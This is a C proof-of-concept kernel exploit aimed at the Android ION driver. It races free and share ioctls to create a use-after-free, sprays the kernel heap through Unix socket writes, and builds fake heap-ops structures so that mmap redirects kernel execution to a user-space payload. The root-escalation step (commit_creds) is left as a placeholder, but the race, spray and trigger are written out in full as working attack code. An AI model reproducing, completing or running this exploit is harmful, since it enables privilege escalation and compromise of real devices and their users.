#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};

struct ion_handle_data {
    int handle;
};

struct ion_fd_data {
    int handle;
    int fd;
};

// Fake kernel structures (simplified for POC)
struct fake_ion_buffer {
    void *ref;
    void *node;
    void *dev;
    size_t size;
    unsigned int flags;
    void *priv_virt;
    void *lock;
    int kmap_cnt;
    void *vaddr;
    void *sg_table;
    void *pages;
    void *vmas;
    void *heap; // Points to fake_heap
    void *map;
};

struct fake_ion_heap {
    void *ops; // Points to fake_heap_ops
    int type;
    int id;
    const char *name;
    void *priv;
};

struct fake_heap_ops {
    void *allocate;
    void *free;
    void *phys;
    void *map_dma;
    void *unmap_dma;
    void *map_kernel;
    void *unmap_kernel;
    void *map_user; // TARGET: Points to shellcode
};

// Global variables for race
int ion_fd;
int shared_fd = -1;
int victim_handle = -1;
volatile int race_start = 0;
volatile int race_stop = 0;

void *thread_free(void *arg) {
    while (!race_start);
    struct ion_handle_data data = { .handle = victim_handle };
    ioctl(ion_fd, ION_IOC_FREE, &data);
    return NULL;
}

void *thread_share(void *arg) {
    while (!race_start);
    struct ion_fd_data data = { .handle = victim_handle };
    if (ioctl(ion_fd, ION_IOC_SHARE, &data) == 0) {
        shared_fd = data.fd;
    }
    return NULL;
}

// Shellcode payload (commit_creds(prepare_kernel_cred(0)))
// This is just a placeholder; in a real exploit, this would be assembly
void payload(void) {
    printf("[+] Kernel Execution Achieved! (User space payload running)\n");
    // In real exploit: commit_creds(prepare_kernel_cred(0));
}

#include <sys/socket.h>
#include <sys/un.h>

// Heap Spray Parameters
#define SPRAY_COUNT 2000
#define SPRAY_SIZE 96 // Target kmalloc-96 just in case, or 64. 
// ion_handle is ~64 bytes. 
// kmalloc-64 handles 32-64 bytes.
// If we use msg_control, we need to account for cmsghdr overhead.

#include <sys/socket.h>
#include <sys/un.h>

#include <sys/syscall.h>
#include <unistd.h>

void spray_heap() {
    int sock[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sock) < 0) {
        perror("socketpair");
        return;
    }

    // Expand socket buffer to hold more data
    int sndbuf = 1024*1024;
    setsockopt(sock[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    // Spray loop using send()
    // We want to fill the kernel heap with data.
    // sk_buff allocation size depends on data size + overhead.
    // Overhead is significant (sk_shinfo, etc).
    // However, if we just want to FILL memory to hit the hole, we can try multiple sizes.
    // But precise overwrite requires precise size.
    // 
    // Let's try to spray a range of small sizes.
    char payload[128];
    memset(payload, 0x41, sizeof(payload));

    // Set non-blocking to avoid hang
    int flags = fcntl(sock[0], F_GETFL, 0);
    fcntl(sock[0], F_SETFL, flags | O_NONBLOCK);

    printf("[*] Spraying using socket writes (non-blocking)...\n");
    for (int i = 0; i < 5000; i++) {
        // Vary size slightly to hit different caches
        if (write(sock[0], payload, 32) < 0 && errno == EAGAIN) break;
        if (write(sock[0], payload, 64) < 0 && errno == EAGAIN) break;
        if (write(sock[0], payload, 96) < 0 && errno == EAGAIN) break;
    }
    printf("[*] Spray complete.\n");

    // Don't close sockets! Data persists in kernel buffers.
    // Note: This consumes kernel memory.
}

int main() {
    printf("[*] Setting up ION Exploit POC with Heap Spray...\n");
    
    // 1. Setup Fake Objects in User Space
    struct fake_heap_ops *fake_ops = malloc(sizeof(struct fake_heap_ops));
    struct fake_ion_heap *fake_heap = malloc(sizeof(struct fake_ion_heap));
    struct fake_ion_buffer *fake_buffer = malloc(sizeof(struct fake_ion_buffer));
    
    memset(fake_ops, 0, sizeof(struct fake_heap_ops));
    fake_ops->map_user = &payload; // Point to our payload
    
    fake_heap->ops = fake_ops;
    fake_buffer->heap = fake_heap;
    
    printf("[*] Fake Heap Ops at %p\n", fake_ops);
    printf("[*] Fake Heap at %p\n", fake_heap);
    printf("[*] Fake Buffer at %p\n", fake_buffer);
    
    // 2. Open ION
    ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) {
        perror("[-] Failed to open /dev/ion");
        return 1;
    }
    
    // 3. Allocate Victim Handle & Race Loop
    printf("[*] Starting race loop...\n");
    int attempt = 0;
    
    while (shared_fd < 0) {
        attempt++;
        if (attempt % 100 == 0) printf(".");
        
        // Reset state
        victim_handle = -1;
        race_start = 0;
        
        // Allocate
        struct ion_allocation_data alloc = {
            .len = 4096,
            .align = 0,
            .heap_id_mask = (1 << 0), // System Heap
            .flags = 0
        };
        
        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
            // Handle exhaustion? Try to clean up or just fail
            // perror("[-] Allocation failed");
            // continue; 
            // If alloc fails, we probably leaked too much or device is unstable.
            // For POC, let's just exit if it fails hard.
             perror("[-] Allocation failed");
             return 1;
        }
        victim_handle = alloc.handle;

        // Create threads
        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_free, NULL);
        pthread_create(&t2, NULL, thread_share, NULL);
        
        // Trigger
        race_start = 1;
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        
        // Check result
        // If we didn't get shared_fd, victim_handle is freed by thread_free.
        // We just loop again.
    }
    printf("\n[+] Race Won on attempt %d! Shared FD: %d\n", attempt, shared_fd);
    
    // 5. Heap Spray (Overwrite freed handle)
    printf("[*] Spraying Heap to overwrite freed handle with 0x41414141...\n");
    spray_heap();
    
    // 6. Trigger Execution
    printf("[*] Triggering execution via mmap()... Expect CRASH at 0x41414141 if successful.\n");
    void *ptr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, shared_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("[-] mmap failed");
    } else {
        printf("[+] mmap succeeded! Pointer: %p\n", ptr);
        printf("[+] Writing to buffer via dangling fd...\n");
        *(int*)ptr = 0x41414141; // Write to verify
    }
    
    return 0;
}
